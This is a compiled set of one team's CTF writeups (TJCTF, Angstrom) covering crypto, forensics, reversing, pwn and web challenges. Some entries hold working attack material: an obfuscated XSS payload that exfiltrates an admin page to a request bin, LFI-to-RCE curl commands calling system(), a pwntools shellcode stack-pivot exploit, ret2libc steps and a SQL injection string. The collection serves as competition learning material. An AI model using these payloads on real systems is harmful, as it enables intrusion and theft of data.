<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-clubby789
description: CTF writeups and security challenges by clubby789.
---

# Writeups by clubby789

Source repository: `/repos/clubby789`

## Repository Index

- Writeups/README.md
- Writeups/Angstrom/Jammy is a nerd.md
- Writeups/TJCTF/ASMR.md
- Writeups/TJCTF/Admin secrets.md
- Writeups/TJCTF/Censorship.md
- Writeups/TJCTF/Circus.md
- Writeups/TJCTF/Cookie Library.md
- Writeups/TJCTF/Cookie Monster.md
- Writeups/TJCTF/Discord.md
- Writeups/TJCTF/El primo.md
- Writeups/TJCTF/File Viewer.md
- Writeups/TJCTF/Forwarding.md
- Writeups/TJCTF/Gamer F.md
- Writeups/TJCTF/Gamer M.md
- Writeups/TJCTF/Gamer R.md
- Writeups/TJCTF/Gamer W.md
- Writeups/TJCTF/Gym.md
- Writeups/TJCTF/Hexillology.md
- Writeups/TJCTF/Is this Crypto.md
- Writeups/TJCTF/Jarvis.md
- Writeups/TJCTF/Ling ling.md
- Writeups/TJCTF/Login sequel.md
- Writeups/TJCTF/Moar Horse 4.md
- Writeups/TJCTF/OSRS.md
- Writeups/TJCTF/Rap God.md
- Writeups/TJCTF/Reasonably Secure Algorithm.md
- Writeups/TJCTF/Sarah Palin Fanpage.md
- Writeups/TJCTF/Seashells.md
- Writeups/TJCTF/Slicer.md
- Writeups/TJCTF/Stop.md
- Writeups/TJCTF/TTW.md
- Writeups/TJCTF/Timed.md
- Writeups/TJCTF/Tinder.md
- Writeups/TJCTF/Titanic.md
- Writeups/TJCTF/Weak password.md
- Writeups/TJCTF/Zipped up.md
- Writeups/TJCTF/arabfunny.md
- Writeups/TJCTF/comprehensive2.md
- Writeups/TJCTF/difficult decryption.md
- Writeups/TJCTF/home rolled.md
- Writeups/TJCTF/rgbsa.md
- Writeups/TJCTF/Crypto/Difficult Decryption.md
- Writeups/TJCTF/Crypto/Home Rolled.md
- Writeups/TJCTF/Crypto/Is this Crypto.md
- Writeups/TJCTF/Crypto/RGBSA.md
- Writeups/TJCTF/Crypto/Reasonably Secure Algorithm.md
- Writeups/TJCTF/Crypto/Titanic.md
- Writeups/TJCTF/Forensics/Cookie Monster.md
- Writeups/TJCTF/Forensics/Gamer F.md
- Writeups/TJCTF/Forensics/Hexillology.md
- Writeups/TJCTF/Forensics/Ling ling.md
- Writeups/TJCTF/Forensics/Rap God.md
- Writeups/TJCTF/Misc/Censorship.md
- Writeups/TJCTF/Misc/Discord.md
- Writeups/TJCTF/Misc/Gamer M.md
- Writeups/TJCTF/Misc/Jarvis.md
- Writeups/TJCTF/Misc/Slicer.md
- Writeups/TJCTF/Misc/TTW.md
- Writeups/TJCTF/Misc/Timed.md
- Writeups/TJCTF/Misc/Zipped up.md
- Writeups/TJCTF/Misc/arabfunny.md
- Writeups/TJCTF/Pwn/Cookie Library.md
- Writeups/TJCTF/Pwn/El primo.md
- Writeups/TJCTF/Pwn/OSRS.md
- Writeups/TJCTF/Pwn/Seashells.md
- Writeups/TJCTF/Pwn/Stop.md
- Writeups/TJCTF/Pwn/Tinder.md
- Writeups/TJCTF/Reversing/ASMR.md
- Writeups/TJCTF/Reversing/Comprehensive2.md
- Writeups/TJCTF/Reversing/Forwarding.md
- Writeups/TJCTF/Reversing/Gamer R.md
- Writeups/TJCTF/Reversing/Gym.md
- Writeups/TJCTF/Web/Admin secrets.md
- Writeups/TJCTF/Web/Circus.md
- Writeups/TJCTF/Web/File Viewer.md
- Writeups/TJCTF/Web/Gamer W.md
- Writeups/TJCTF/Web/Login sequel.md
- Writeups/TJCTF/Web/Moar Horse 4.md
- Writeups/TJCTF/Web/Sarah Palin Fanpage.md
- Writeups/TJCTF/Web/Weak password.md
- Writeups/Angstrom/Wacko Images/Wacko Images.md

## Writeup Content


### File: Writeups/README.md

# Writeups
This is where we post our writeups for CTF challs!

When uploading writeups,  
use '# ' for the title  
use '#### ' for the flag  
If you want a line break, do a double space  
If there is any code, do the same big quote thing for discord and then with the language you want after it, like [3 backticks]python and remember to close after  
Also remember to add file extension .md



### File: Writeups/Angstrom/Jammy is a nerd.md

Thanks
```python
print 'jammy nerd'
```



### File: Writeups/Angstrom/Wacko Images/Wacko Images.md

# Wacko Images

We have ab mod c = d where we know b (key), c (251), and d (encrypted pixel value).
Multiplying by the modular inverse of b gets us:
a mod c = d * b^-1 mod c

Calculate this for every pixel in the image with a script, and you get an image that contains the flag.

```py
import numpy as np
from PIL import Image
from Crypto.Util.number import inverse

enc_image = Image.open('enc.png')
img = np.array(enc_image)

a, b, c = img.shape

key = [41, 37, 23]

for x in range(0, a):
    for y in range(0, b):
        pixel = img[x, y]
        for i in range(0, 3):
            pixel[i] = inverse(key[i], 251) * pixel[i] % 251
        img[x, y] = pixel

flag = Image.fromarray(img)
flag.save('flag.png')
```

The flag is:
#### actf{m0dd1ing_sk1llz}



### File: Writeups/TJCTF/ASMR.md

# ASMR

( https://gist.github.com/bobbo/e1e980262f2ddc8db3b8 for help)
So we download the file, and we find that it's pure assembly written in intel syntax, nice. Let's compile it:
nasm -f elf64 -o asmr.o asmr.asm
ldd -o asmr asmr.o
When we run it, we don't get anything back. Odd. Lets see what's in the assembly.
I decided to reverse all the assembly so that we can get a good picture of what's happening. 
Basically, in main, it's creating a socket, setting some options for the socket, binding the connection to port 1337, 
listening on any address, then accepts the connection. Once we connect, it sends "Enter Password:".
The program then reads our input, and checks to see whether it's 17 chars (16 + null byte). 
If our input isn't 16 chars + null byte, it chucks us to label5, which is basically output "Nope" and then end the connection.
So we don't want that. We see that label2 compares our last char to null byte. 
Whilst our input != a null byte, it xors it with key 0x69 (105 in decimal) (that's what label1 does).
Label2 then checks to see if that's the password, and if it's correct, it spits out 56333 chars of hex at us. 
If we get the hex that it moves to the rax register (0x360c1f0605360c1e) and (0x0c0c10361b041a08), xor it with key 0x69 and reverse, 
we get "we_love_asmr_yee". Input that as the password, and the hex gets spit out.
If we restart it all again but save to a file, that's a lot nicer to work with. 
The flag isn't in the strings, but if we take a look at it in ghex, we see a whole load of things.
Removing the "Enter password:" and looking at the file headers, we see that it's a .ogg file.
Save the file as that, open it in an audio player,
and we get "The flag is tjctf{Bravo Uniform Bravo 6 Lira Echo _ Whiskey Romeo 4 Pop _ Pop 0 Pop}" 
That's a very long flag, so probably not.
Using the hint they gave us (NATO Phonetic Alphabet), we can swap the words for letters and we get a nice message from the team,
as well as  tjctf{s0m3_n1c3_s0und5_for_you!!!}



### File: Writeups/TJCTF/Admin secrets.md

# Admin secrets

Can perform XSS by reporting to admin
Admin dashboard has a link to /admin_flag
Requesting admin_flag from a page with {, ", ', `, or <script> gives an error
```java
<img src="0" onerror="eval(String.fromCharCode(118,97,114,32,120,104,116,116,112,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,120,104,116,116,112,46,111,110,114,101,97,100,121,115,116,97,116,101,99,104,97,110,103,101,61,102,117,110,99,116,105,111,110,40,41,123,118,97,114,32,120,104,116,116,112,50,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,105,102,40,116,104,105,115,46,115,116,97,116,117,115,61,61,50,48,48,41,123,120,104,116,116,112,50,46,111,112,101,110,40,39,71,69,84,39,44,39,104,116,116,112,58,47,47,114,101,113,117,101,115,116,98,105,110,46,110,101,116,47,114,47,49,103,50,117,104,110,55,49,63,111,117,116,61,39,43,101,110,99,111,100,101,85,82,73,40,98,116,111,97,40,116,104,105,115,46,114,101,115,112,111,110,115,101,84,101,120,116,41,41,44,116,114,117,101,41,125,101,108,115,101,123,120,104,116,116,112,50,46,111,112,101,110,40,39,71,69,84,39,44,39,104,116,116,112,58,47,47,114,101,113,117,101,115,116,98,105,110,46,110,101,116,47,114,47,49,103,50,117,104,110,55,49,63,111,117,116,61,39,43,116,104,105,115,46,115,116,97,116,117,115,44,116,114,117,101,41,125,120,104,116,116,112,50,46,115,101,110,100,40,41,125,59,120,104,116,116,112,46,111,112,101,110,40,39,71,69,84,39,44,39,47,97,100,109,105,110,95,102,108,97,103,39,44,116,114,117,101,41,59,120,104,116,116,112,46,115,101,110,100,40,41,59))">
```
Takes the flag and forwards it to a request bin



### File: Writeups/TJCTF/Censorship.md

# Censorship

```python
from pwn import *
r = remote("p1.tjctf.org", 8003)
out = (r.recvline())
print(out)
out = eval(out.split('is ')[2][:-2])
r.sendline(str(out))
print(r.recvline())
print(r.recvline())
This works and I don't know why
tjctf{TH3_1llum1n4ti_I5_R3aL}
```



### File: Writeups/TJCTF/Circus.md

# Circus

/.git exists, use gitdumper to get source
Type juggling, password is sha256'd and compared with ==
Revert to get old user creds from git
34250003024812 is a magic sha256 string
Andon1956:34250003024812



### File: Writeups/TJCTF/Cookie Library.md

# Cookie Library

NX, no PIE. The whole cookie thing is largely irrelevant so I'm not gonna comment on it.

It calls gets on rbp-0x50, opening an avenue for buffer overflow. We can do a ret2plt attack,
calling puts@plt on puts@got in order to leak a libc address, specifically that of puts.
Then, we can subtract the appropriate offset to get the libc base.

From there, it's a simple ret2libc attack. We call system("/bin/sh") using pop rdi.
The problem is, this doesn't seem to work. To make it work, we have to set rsi and rdx to 0.
We don't have a pop rdx gadget inside of the binary, so it's impossible... right?

Wrong, actually. At this point in the exploit, we know the libc base, so we can use rop gadgets inside of the libc. 
So the full exploit is:
```
1. use ret2plt to leak a libc address via the PLT and GOT
2. do poprdi + /bin/sh + pop rdx ; pop rsi + 0 + 0 + system in order to pop a shell
```



### File: Writeups/TJCTF/Cookie Monster.md

# Cookie Monster

Windows 7 sp1 x64 memdump
By grepping for urls, we can find https://super-secret-file-server.herokuapp.com/.
Command history shows us the credentials with a username and password, and also the name of a deleted file.
We download this file: _4nd_y0u_w1ll_n3v3r_f1nd_m333}
We now see that mstsc is running, which is the rdp client. I used filescan to search for open files, and found an the rdp cache file.
We can use https://github.com/ANSSI-FR/bmc-tools to parse it, and get 128 tiles from the image. By piecing this together (thanks will) we get the first half of the flag:
tjctf{c00k1e_m0n5t3r_w4s_h3r3
#### tjctf{c00k1e_m0n5t3r_w4s_h3r3_4nd_y0u_w1ll_n3v3r_f1nd_m333}



### File: Writeups/TJCTF/Crypto/Difficult Decryption.md

# difficult decryption

So i just followed the tutorial kek. i spent so long understanding what it meant so heres a summary of it
```
1. compute prime factors of totient p in form p^k
2. find x modulo p^k (ill show later)
3. chinese remainder thereom!!!!!
4. compute shared key (other ** step3 % modulus)
5. xor and convert to hex then text!!!
tjctf{Ali3ns_1iv3_am0ng_us!}
```

did it this script (after chinese remainder i got `64460789473481109991812750133942026256` alice - doesnt need to be prime because they cycle)
```python
a = 491988559103692092263984889813697016406
msg = 12259991521844666821961395299843462461536060465691388049371797540470
c = [232042342203461569340683568996607232345,76405255723702450233149901853450417505]

at = 1
for i in a0:
    at *= phi(i)
print(at)

at0 = [[2**32],[3**15],[5**4],[7**3],[11],[13**2],[17],[19],[23],[29],[37],[53],[79],[109]]

for i in at0:
    temp = pow(c[0],at//i[0],a)
    for j in range(1,10000):
        if pow(pow(5,at//i[0],a),j,a) == temp:
            print(j,",",i[0],end = "),(")
            break
    else:
        print(j,"??")
  ```   



### File: Writeups/TJCTF/Crypto/Home Rolled.md

# home rolled

So after deobfuscating the script (which i didnt rly needed to) i found it was encrypted with a otp of random order of range(256). so then i thought "kek how can i break otp" but then i realised it never repeats itself. i also knew that it started with "tjctf{" and ended with "}". i created a list of possible values left and used that for each position of the flag. this gave me a bunch of characters possible for that position. i just needed to repeat it until there was 1 char left (connected with vpn cus doxx). i did it with this script.
#### tjctf{n3v3r_r0LL_ur_0wn_cryptOMEGALUL}



### File: Writeups/TJCTF/Crypto/Is this Crypto.md

# Is this Crypto

Single byte xor bruteforce with key 0x91  
#### tjctf{n0_th15_is_kyl3}



### File: Writeups/TJCTF/Crypto/RGBSA.md

# rgbsa

Extract red pixel vals from each frame (last bit)
go to day's site

 https://medium.com/bugbountywriteup/rsa-attacks-common-modulus-7bdb34f331a5 
 
copy code with adjustments. convert output to text and bam! 
#### flag{excitable_illumination_wanderer_}

```python
def main():
    from PIL import Image, ImageFilter

    def openshit(filename):
        # Open image file
        im = Image.open(filename)

        print("\n** Analysing image **\n")

        # Display image format, size, colour mode
        print("Format:", im.format, "\nWidth:", im.width, "\nHeight:", im.height, "\nMode:", im.mode)

        # Check if GIF is animated
        frames = im.n_frames

        print("Number of frames: " + str(frames))
        print("\n** Converting image **\n")

        alls = []
        # Iterate through frames and pixels, top row first
        for z in range(frames):
            # Go to frame
            im.seek(z)
            rgb_im = im.convert('RGB')
            # print("Frame: ", im.tell())

            pixels = list(rgb_im.getdata())

            a = int("".join([str(r[0]%2) for r in pixels]),2)
            # print("--------------------------------------")
            # print(a)
            # print("--------------------------------------")
            alls.append(a)

        return alls


    alln = openshit("n.gif")
    alle = openshit("e.gif")
    allc = openshit("new_c.gif")
```



### File: Writeups/TJCTF/Crypto/Reasonably Secure Algorithm.md

# Reasonably Secure Algorithm

With an n value this small, it can be quite easily cracked.  
I used RsaCtfTool (git clone https://github.com/Ganapati/RsaCtfTool), with the command:  
```python
python RsaCtfTool.py -n 126390312099294739294606157407778835887 -e 65537 --uncipher 13612260682947644362892911986815626931
```
#### tjctf{10minutes}



### File: Writeups/TJCTF/Crypto/Titanic.md

# Titanic

The first step is to get a list of all the words from the titanic:

```bash
curl http://www.dailyscript.com/scripts/Titanic.txt | tr '[:space:]' '\n' | sed  '/^$/d' | | tr -d '.' | tr -d ',' | tr '[:upper:]' '[:lower:]' > wl
```

Now we create a new wordlist in flag format:
```bash
for i in $(cat wl); do echo "tjctf{$i}" >> wl2; done
```

Then we can use the password cracking tool john to get the flag.
```bash
john -w=wl3 hash --format=raw-md5
```

#### The flag is tjctf{ismay's}



### File: Writeups/TJCTF/Discord.md

# Discord

This challenge was definitely one of the harder ones in the CTF, mainly because of it's deceiving point value, at only 5 points. 
The description doesn't provide any information at all, which was very strange, and the fact that the challenge was categorized as "Misc" also made it very confusing, as should the challenge not be OSINT if nothing at all is provided? 

This ended up taking a very long time to figure out. Perhaps the title would give a bigger hint? It mentions Discord, which is a common text and voice messaging service used by gamers. 

I myself, am not a gamer, so I wasn't too keen on the idea of registering at discord.com, but if I was going to get 5 points for it, I was going to do it nonetheless. 

Registering however, was a challenge in itself. 

The difficulty lies in that you have to put personal information in, but wait... Do I really trust a site like discord with my personal details? 

Were these 5 points really worth it? I asked myself.

"Yes. Yes they are. We must beat our rivals Pwn to 0xE4!". 

And so, reluctantly, I filled in my details, and added 2 Factor Authentication for safety. 

These 5 points were going to be so worth it. 

However, how was I to get into the server where the flag was? 

I would need an invite link. But where was I to get that? 

Well, I started by trying to OSINT the challenge creators, in the hopes that they would have left something in their social medias, but it ended up with no results, to my sadness. 

I looked for minutes, hours, days for this link, but nothing showed up.

Eventually, I gave up and decided to come back to this challenge another day. I decided to look at other challenges. 

What about that circle one? Or the difficult decryption one? 

But still, there was a feeling in my heart. 

A feeling that meant I would HAVE to get those 5 points. 

After all, it could mean the difference between winning and losing...

One morning, while scrolling through the challenges, I noticed something rather interesting. 

There was a logo that looked oddly familiar amongst the email, Facebook and Twitter logos. 

At once I recognised what it was.

IT WAS THE DISCORD LOGO! Hovering over it, I saw it redirected to a discord.gg link. 

Perhaps this was it? 

Perhaps this was the link to join the discord?? With my right hand sweating and shivering, I moved my mouse towards the icon, and clicked.

For a moment... There was silence. 

Nothing could be heard, except for the faint sound of rickrolls in the background, and the weird audio for arabfunny. 

Suddenly, I was greeted with a page. "evanyeyeye invited you to join TJCTF". 

This was it. Those 5 points were going to be mine, and we would crush Pwn to 0xE4 like twigs. 

However, it turns out this was again, still not enough. The security of the server was set to very high, and I needed to pass a captcha. 

"No problem!", I thought. "I can just use my OCR script!". 

However, despite trying over 2 times to try and get the OCR script to work, I never managed to do it, and time was running out. 

There were only 95 hours left in the CTF. 

This needed to be quick.

We were running out of time. 

This was an emergency.

Immediately I recruited help from our team's Asian, PotatoK. He was able to read the letters and numbers and so, after a long while of waiting, we got access to the server! Those 5 points were finally going to be ours! However, once again, due to the delicate crafting of this challenge by the creator, KyleForkBomb(who even is that guy), we were stopped in our tracks once again. "How many parts does this challenge have?", I thought to myself. I decided to go back to the challenge page, and luckily enough, there was a relevant hint!

`"Type ?flag in chat"`

So I proceeded to type in "?flag in chat", in the hopes that it would give me the flag, but after 5 seconds of me typing "?flag in chat" into notepad, it was clear that this was going nowhere. So, I kept on pushing. I found a shortcut for typing it as well, by simply CTRL-C to copy and CTRL-V to paste. However, even after a further 7 seconds of typing it, no flag was there. Where was this flag, and why was it so difficult just for 5 measly points? I had to beat Pwn to 0xE4. I had to.

After a few more seconds of trying to type "?flag into chat" into my notepad window, I decided to try and take the hint from another perspective. 
I decided to read the hint once more.

`"Type ?flag in chat"`

Ever since we discovered the hint, we had always interpreted it as 'Type "?flag i n chat"'. But what if it was meaning something else? For example, it could have meant 'Type "?flag" in chat'.

Now everything made sense. 

The pain of trying to find the Discord link. The captcha which I had to get PotatoK to solve. The registering for the Discord account. It all made sense now. All the suffering we went through. 

With palms still sweating, I slowly typed "?flag" into the #general chat. 

There was no one else around as far as I could tell. I was going to crush Pwn to 0xE4. 

I was going to get these points. 

I was close, I could feel it.

I could definitely taste the flag.

I felt so close. 

Once I typed "?flag" in chat, there was silence yet again.

I could feel the sense once again, just like when I clicked on the discord link.

A few seconds passed. 

Then, I saw my message get deleted? Who could have done this? Was it the evil mind of the challenge creator? Was it... no... it couldn't be... Pwn to 0xE4??? 

Could they have done this in order to get the flag and the points before us? 

This was a disaster. 

We needed those points. 

This was turning into a nightmare, and there were only 94 hours left in the CTF. 

We needed a plan to take them down, and fast. We quickly retreated back to the Jackbox server in order to discuss. 

This had to be done quick. 

We would need to act fast.

Our plan was simple. We would just need to type the command, and the get output before Pwn to 0xE4 would have a chance to intervene. 

Using my new techniques I learnt from Truly Terrible Why, and also the CTRL-C CTRL-V technique from earlier, I was set to get this flag. This was going to work. 

I was going to get this flag, get those 5 points, and crush Pwn to 0xE4. 

I could taste victory already, and those CTFTime points would definitely be ours.

We were almost ready to execute the plan. 

This would be it. 

The flag would be ours. 

Those 5 points we worked so hard for. 

Registering the account, finding the link, getting past the captcha, using the hint. All the pain and suffering would finally pay off. 

We were ready to take on Pwn to 0xE4.

We waited for the perfect moment to strike, but we had to be extra careful, as we did not expect them last time...

The plan was in action! I pasted the command carefully, but swiftly, and awaited the response...

Yet again... silence...

Until...

We were able to retrieve a message link...

https://discordapp.com/channels/426043976957820940/467040678820446209/713526612158840843

It appears this takes us to the announcements channel, which I scrolled through a couple times, but couldn't find anything of use. 

Where was this flag, and why was this challenge only worth 5 points???

Then... something caught my eye...

It appeared to be... an image... with some text on it. The words looked familliar... especially the "tjctf" part...

Suddenly, I realised what this was. 

This was the flag!! The very thing that took almost 2 minutes to find was right in front of us!! 

I had to get PotatoK once again to read it for me, but we finally found the flag after a lot of sweat, pain, and effort. 

Swiftly I wrote the flag down, and copied it into the flag box.

"Correct!" it read, and those 5 points were finally ours.

We would go on to get defeated by Pwn to 0xE4, as they solved Naughty, meaning that these 5 points made all the difference.

Thank you for making this one of the most difficult CTF challenges I have ever solved, and even though it was only worth 5 points, they were more than satisfying to get.
#### Flag: tjctf{circles_was_a_bad_challenge}

-@Willwam845



### File: Writeups/TJCTF/El primo.md

# El primo

There's no NX, AND a gets call. On top of this, the program sends us the buffer address. A simple ret to shellcode, right?

Wrong, in fact. We have to buffer overflow from main, which makes things more difficult.
Instead of the classic leave ; ret, it pops a value into ecx, then loads ecx - 4 into esp.
This removes our classic buffer overflow where we change EIP. Instead, we must stack pivot.

We have control of ESP. When you call ret, the program jumps to the address stored at ESP.
We can set esp to the address of the buffer.
Then, we change the beginning of our buffer to be the address of our shellcode.I put the shellcode after the esp.

We can use pattern.py to figure out the amount of bytes until esp, which is 32.

#### NOTE! it subtracts 4 from our chosen esp value, so we must take care of this.
I created custom shellcode that had to have the address of a string /bin/sh which I also put in the input.
```python
from pwn import *
import re
NUM_TO_ESP = 32
p = remote('p1.tjctf.org', 8011)
p.recvline()
output = p.recvline().decode()
bufaddr = int(re.findall("hint: (,*)", output)[0],16)
shellcode = asm(f"mov ebx,{hex(bufaddr + 4)} ; mov ecx,0 ; mov edx,0 ; mov eax,0xb ; int 0x80") 
start = flat(bufaddr + 36, b"/bin/sh\x00")
espval = bufaddr + 4
payload = start
payload += b'A' * (NUM_TO_ESP - len(payload))
payload += p32(espval)
payload += shellcode
p.sendline(payload)
p.interactive()
```



### File: Writeups/TJCTF/File Viewer.md

# File Viewer

Basic LFI Vuln  
curl -XPOST 'https://file_viewer.tjctf.org/reader.php?file=php://input' -d '<?php system("whoami"); ?>' - www-data
ls -la:  
```
-r--r--r-- 1 root     root       44 May 18 15:32 apple.txt
-r--r--r-- 1 root     root       74 May 24 15:12 grape.txt
dr-xr-xr-x 1 root     root     4096 May 24 15:12 i_wonder_whats_in_here
-r--r--r-- 1 root     root     3012 May 18 15:32 index.html
-r--r--r-- 1 root     root       27 May 18 15:32 orange.txt
-r--r--r-- 1 root     root       49 May 18 15:32 pear.txt
-r--r--r-- 1 root     root       27 May 18 15:32 pinneaple.txt
-r--r--r-- 1 root     root     2532 May 18 15:32 reader.php
-r--r--r-- 1 root     root       22 May 18 15:32 watermelon.txt
```
```php
curl -XPOST 'https://file_viewer.tjctf.org/reader.php?file=php://input' -d '<?php system("cat i_wonder_whats_in_here/* "); ?>'
```
#### tjctf{n1c3_j0b_with_lf1_2_rc3}



### File: Writeups/TJCTF/Forensics/Cookie Monster.md

# Cookie Monster

Windows 7 sp1 x64 memdump
By grepping for urls, we can find https://super-secret-file-server.herokuapp.com/.
Command history shows us the credentials with a username and password, and also the name of a deleted file.
We download this file: _4nd_y0u_w1ll_n3v3r_f1nd_m333}
We now see that mstsc is running, which is the rdp client. I used filescan to search for open files, and found an the rdp cache file.
We can use https://github.com/ANSSI-FR/bmc-tools to parse it, and get 128 tiles from the image. By piecing this together (thanks will) we get the first half of the flag:
tjctf{c00k1e_m0n5t3r_w4s_h3r3
#### tjctf{c00k1e_m0n5t3r_w4s_h3r3_4nd_y0u_w1ll_n3v3r_f1nd_m333}



### File: Writeups/TJCTF/Forensics/Gamer F.md

# Gamer F  

Use dnspy to read Assembly-CSharp -  
tjctf{wh3rs_  
Part 2 - Use AssetStudioGUI - VictorySound2.wav (1.wav is japanese)  
Voice says: Flag part 2 is: "the_T5sp1n" or 0x7468655f54357370316e (Hex gives capitalised T)  
Part 3: Strings level0 and grep for '}' (probably not intended lmao)  
#### tjctf{wh3rs_the_T5sp1n_sn4ekk}



### File: Writeups/TJCTF/Forensics/Hexillology.md

# Hexillology

For this one open the image in gimp select color picker. 
Also open the color section in windows/dockable dialogs/colors then click on each section and note down the hex color values:    
`746a63 74667b 63306c 6f7266 75315f 666c34 67217d`  
decode this from hex and we get the flag:  
#### tjctf{c0lorfu1_fl4g!}



### File: Writeups/TJCTF/Forensics/Ling ling.md

# Ling ling

Download -> exiftool meme.png -> profit  
#### Flag: tjctf{ch0p1n_fl4gs}



### File: Writeups/TJCTF/Forensics/Rap God.md

# Rap God

Right channel of audio is different  
Remove left channel, get full spectogram with https://convert.ing-now.com/mp3-audio-waveform-graphic-generator  
Wingdings2  
#### tjctf{quicksonic}



### File: Writeups/TJCTF/Forwarding.md

# Forwarding  

Download -> strings ./forward -> scroll up  
#### tjctf{just_g3tt1n9_st4rt3d}



### File: Writeups/TJCTF/Gamer F.md

# Gamer F  

Use dnspy to read Assembly-CSharp -  
tjctf{wh3rs_  
Part 2 - Use AssetStudioGUI - VictorySound2.wav (1.wav is japanese)  
Voice says: Flag part 2 is: "the_T5sp1n" or 0x7468655f54357370316e (Hex gives capitalised T)  
Part 3: Strings level0 and grep for '}' (probably not intended lmao)  
#### tjctf{wh3rs_the_T5sp1n_sn4ekk}



### File: Writeups/TJCTF/Gamer M.md

# Gamer M

After analysing the random.randint i found that it was rigged (info by botters) so i just reversed what it done (with help from tony) and pieced it together - code below  
#### tjctf{i5AJ0borFRenCx6342}

```python
def getindex(a):
    out = []
    for i in a:
        if "{" in i:
            out.append(0)
        if "3" in i:
            out.append(1)
        if "4" in i:
            out.append(2)
        if "2" in i:
            out.append(3)
        if "}" in i:
            out.append(4)
    return out

with open("out","r") as f:
    out = f.read()
    f.close()
out = out.split("\n")[:-2]
out = [[x[i:i+5] for i in range(0, len(x), 5)] for x in out ]
stats = ""
for j in range(5):
    for i in out:
        a = getindex(i)
        print(a)
        stats += str((a.index(j)-j)%5)
print(stats) # 4 is common
counter = [0,0,0,0,0]
for i in stats:
    counter[int(i)] += 1

print(counter)
for k in range(5):
    for j in range(5):
        alpha = out[0][getindex(out[0]).index(k)]
        alpha2 = {}
        for i in alpha:
            alpha2[i] = 0

        for i in out:
            thing = i[getindex(i).index(k)]
            thing = thing[-1]+thing[:-1] # revshift by 4
            alpha2[thing[j]] += 1

        for i in alpha:
            print(i,alpha2[i],end=" ")
        print()
```



### File: Writeups/TJCTF/Gamer R.md

# Gamer R

Just remove the duck's ability to move and make knife go brrrrrrrr zoom
and then get flag
#### tjctf{orenji_manggoe}



### File: Writeups/TJCTF/Gamer W.md

# Gamer W

Unity webgl game, requires adding the Cetus Chrome Extension
Use cetus to search (f32) for current health, narrow down results and freeze in place
Increase attack damage to 5000
When placed behind a wall, use either `0x01a508b8`, `0x01a5ab60`, `0x01fc6560`or `0x01fc65b0` to move yourself out  
#### tjctf{c3tus_del3tus_ur_m3ms_g0ne}



### File: Writeups/TJCTF/Gym.md

# Gym

##### Download -> make executable -> create flag.txt

If we take a look at main, we can see that it basically says "starting weight is 211, try and get me down to 180 by day 7" 
(when we run the program, we're presented with 4 options to reduce weight. Have to do this in 7 days). If we rev main, we basically 
only care about this bottom bit
```python
user_input = input("What is your answer?")
iVar1 = int(user_input)

if iVar1 == 2:
    startweight -= 1
else:
    if iVar1 == 3:
        startweight -= 2
    else:
        if iVar1 != 4:
            counter += 1
    startweight -= 3
```
So here, we see that if we choose option 2, we subtract 1 from our weight. If our input isn't 2, then we go to the else. 
If input = 3, subtract 2. If not, then if our input is not 4, then increase the counter. 
But what we notice is that we always subtract 3 from our weight, if our answer wasn't 2.
So now for some simple maths:
```
211 - 180 = 31
31 = 6(2+3) - 1
```
Input in:
3
3
3
3
3
3
2  
Wait 3 seconds, boom, profit

#### tjctf{w3iGht_l055_i5_d1ff1CuLt}



### File: Writeups/TJCTF/Hexillology.md

# Hexillology

For this one open the image in gimp select color picker. 
Also open the color section in windows/dockable dialogs/colors then click on each section and note down the hex color values:    
`746a63 74667b 63306c 6f7266 75315f 666c34 67217d`  
decode this from hex and we get the flag:  
#### tjctf{c0lorfu1_fl4g!}



### File: Writeups/TJCTF/Is this Crypto.md

# Is this Crypto

Single byte xor bruteforce with key 0x91  
#### tjctf{n0_th15_is_kyl3}



### File: Writeups/TJCTF/Jarvis.md

# Jarvis

So i was looking at the csv and thought `"kek tf does this mean"` but then i checked the range values for the csv and saw they were rly
similar. i looked at the hint about tony stark and thought maybe i need to build an ai or some shit. 
woa kept telling me i was mental and had big confusion but i continued anyway.
i built one (code below) and ran it (followed tutorial with adjustments for massive training data).
the output it gave was in binary (like in training data). i converted to text and gave `flag{mlWis_cool} `
but it looked like some bits were flipped so i changed it to `flag{ml_is_cool}` which is flag.

https://medium.com/technology-invention-and-more/how-to-build-a-simple-neural-network-in-9-lines-of-python-code-cc8f23647ca1
```python
hlp = open("help.csv","r").read().split("\n")
hlp = [[int(y) for y in x.split(",")] for x in hlp]

flg = open("flag.csv","r").read().split("\n")
flg = [[int(y) for y in x.split(",")] for x in flg]


from numpy import exp, array, random, dot, set_printoptions, inf
set_printoptions(threshold=inf)

class NeuralNetwork():
    def __init__(self):
        self.synaptic_weights = 2 * random.random((10, 1)) - 1
    def __sigmoid(self, x):
        return 1 / (1 + exp(-x))
    def __sigmoid_derivative(self, x):
        return x * (1 - x)
    def train(self, training_set_inputs, training_set_outputs, number_of_training_iterations):
        for iteration in range(number_of_training_iterations):
            output = self.think(training_set_inputs)
            error = training_set_outputs - output
            adjustment = dot(training_set_inputs.T, error * self.__sigmoid_derivative(output))
            self.synaptic_weights = self.synaptic_weights + adjustment # fukin numpy being shit kek
    def think(self, inputs):
        return self.__sigmoid(dot(inputs, self.synaptic_weights))



neural_network = NeuralNetwork()

print("Random starting synaptic weights: ")
print(neural_network.synaptic_weights)
training_set_inputs = [[y/100 for y in x[1:]] for x in hlp]
training_set_outputs = [x[0] for x in hlp]

print(training_set_inputs[0],training_set_outputs[0])

for i,j in enumerate(training_set_inputs):
    neural_network.train(array([j]), array(training_set_outputs[i]).T, 10000) # gotta train individually or numpy gets triggered

print("New synaptic weights after training: ")
print(neural_network.synaptic_weights)

b = ""
for i,j in enumerate(flg):
    print("Considering new situation :",j)
    a = neural_network.think(array(flg[i]))[0]
    b += str(int(a))
    print(int(a))
print(b)
```



### File: Writeups/TJCTF/Ling ling.md

# Ling ling

Download -> exiftool meme.png -> profit  
#### Flag: tjctf{ch0p1n_fl4gs}



### File: Writeups/TJCTF/Login sequel.md

# Login sequel

Set username to "admin'/*" and the password to whatever
this is so the command executed is  
```sql
"SELECT username, password FROM `userandpassword` WHERE username='admin/*' AND password='<md5 HASH object @ 0x00000151246A95F8>'"
/* is a comment so everything after that is ignored.
```
EZ 
#### flag is tjctf{W0w_wHa1_a_SqL1_exPeRt!}



### File: Writeups/TJCTF/Misc/Censorship.md

# Censorship

```python
from pwn import *
r = remote("p1.tjctf.org", 8003)
out = (r.recvline())
print(out)
out = eval(out.split('is ')[2][:-2])
r.sendline(str(out))
print(r.recvline())
